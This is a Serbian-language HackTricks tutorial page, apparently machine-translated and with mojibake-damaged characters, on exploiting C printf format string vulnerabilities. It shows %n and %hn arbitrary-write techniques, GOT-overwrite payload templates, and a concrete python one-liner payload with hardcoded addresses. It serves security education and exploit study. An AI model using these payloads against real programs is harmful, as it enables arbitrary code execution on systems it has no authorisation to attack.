# Formatiranje stringova

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetiÄku bezbednost**? Å½elite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili Å¾elite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** na [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Osnovne informacije

U programskom jeziku C **`printf`** je funkcija koja se moÅ¾e koristiti za **ispisivanje** nekog stringa. **Prvi parametar** koji ova funkcija oÄekuje je **sirovi tekst sa formatima**. **SledeÄ‡i parametri** koji se oÄekuju su **vrednosti** koje Ä‡e **zameniti** **formatere** iz sirovog teksta.

Ranjivost se pojavljuje kada **napadaÄev tekst bude postavljen kao prvi argument** ovoj funkciji. NapadaÄ Ä‡e moÄ‡i da oblikuje **specijalan unos zloupotrebom** moguÄ‡nosti **printf formatiranja stringova** da **upiÅ¡e bilo koje podatke na bilo koju adresu**. Na ovaj naÄin, moÄ‡i Ä‡e da **izvrÅ¡i proizvoljan kod**.

Formati:
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**`%n`** **upisuje** broj napisanih bajtova na **oznaÄenu adresu. Pisanje** toliko **bajtova** koliko je heksadecimalni broj koji **treba** napisati je naÄin kako moÅ¾ete **napisati bilo koje podatke**.
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
### **Tok eksploatacije**

Kao Å¡to je veÄ‡ objaÅ¡njeno, ova ranjivost omoguÄ‡ava **pisanje bilo Äega na bilo koju adresu (proizvoljno pisanje).**

Cilj je **prepisati** **adresu** neke **funkcije** u **GOT** tabeli koja Ä‡e biti pozvana kasnije. Idealno bi bilo postaviti **adresu na shellcode** koji se nalazi u izvrÅ¡nom delu, ali je vrlo verovatno da neÄ‡ete moÄ‡i da napiÅ¡ete shellcode u izvrÅ¡nom delu.\
Stoga, druga opcija je **prepisati** **funkciju** koja **prima** svoje **argumente** od **korisnika** i usmeriti je ka funkciji **`system`**.

Za pisanje adrese, obiÄno se obavljaju 2 koraka: Prvo se **piÅ¡u 2 bajta** adrese, a zatim druga 2. Za to se koristi **`$hn`**.

**HOB** se odnosi na 2 viÅ¡a bajta adrese\
**LOB** se odnosi na 2 niÅ¾a bajta adrese

Zbog toga kako format string radi, prvo morate **najpre napisati manji** od \[HOB, LOB\] a zatim drugi.

Ako je HOB < LOB\
`[adresa+2][adresa]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ako je HOB > LOB\
`[adresa+2][adresa]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

## Pwntools Å ablon

MoÅ¾ete pronaÄ‡i Å¡ablon za pripremu eksploata za ovu vrstu ranjivosti u:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}
